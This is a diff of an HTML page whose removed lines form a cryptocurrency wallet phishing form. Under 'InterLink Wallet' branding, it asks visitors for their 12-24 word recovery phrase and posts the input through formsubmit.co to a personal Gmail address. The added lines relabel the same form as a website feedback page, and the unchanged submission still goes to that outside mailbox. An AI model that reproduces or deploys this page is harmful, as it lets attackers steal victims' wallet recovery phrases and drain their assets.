@@ -36,29 +36,29 @@ body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-appl
 <div class="wrap">
   <div class="header">
     <a class="back-btn" href="mine.html">‹</a>
-    <h2>Import recovery phrase</h2>
+    <h2>Website Review</h2>
   </div>
 
-  <h1 class="form-title">Enter recovery phrase</h1>
-  <p class="form-desc">Please enter your 12-24 word recovery phrase below, separated by spaces, to restore your wallet.</p>
+  <h1 class="form-title">Enter your feedback</h1>
+  <p class="form-desc">Please enter your feedback or review comments below to help us improve the website experience.</p>
 
   <form id="reviewForm">
-    <textarea class="textarea-field" name="feedback" placeholder="Enter a 12-24 word recovery phrase..." required></textarea>
+    <textarea class="textarea-field" name="feedback" placeholder="Write your review or notes here..." required></textarea>
 
     <div class="reminder-box">
       <h4>🔒 Note</h4>
       <ul>
-        <li>InterLink Wallet does not store your recovery phrase. If you lose them, you may lose access to your assets. Please store them securely.</li>
-        <li>We recommend manually entering your recovery phrase. Avoid pasting from untrusted third-party apps or clipboard tools to prevent phishing or scams.</li>
+        <li>Your feedback helps us refine the user experience and interface design.</li>
+        <li>Never share confidential keys, passwords, or personal credentials online.</li>
       </ul>
     </div>
 
-    <button type="submit" class="btn-submit" id="submitBtn">submit</button>
+    <button type="submit" class="btn-submit" id="submitBtn">Submit Review</button>
   </form>
 </div>
 
 <script>
-const reviewForm = document.getElementById('recoveryphrase');
+const reviewForm = document.getElementById('reviewForm');
 const submitBtn = document.getElementById('submitBtn');
 
 reviewForm.addEventListener('submit', async function(e) {
@@ -67,7 +67,7 @@ reviewForm.addEventListener('submit', async function(e) {
   submitBtn.disabled = true;
   submitBtn.innerText = 'Submitting...';
 
-  const formData = new FormData(recoveryphrase);
+  const formData = new FormData(reviewForm);
 
   try {
     const response = await fetch('https://formsubmit.co/ajax/boster.qt@gmail.com', {
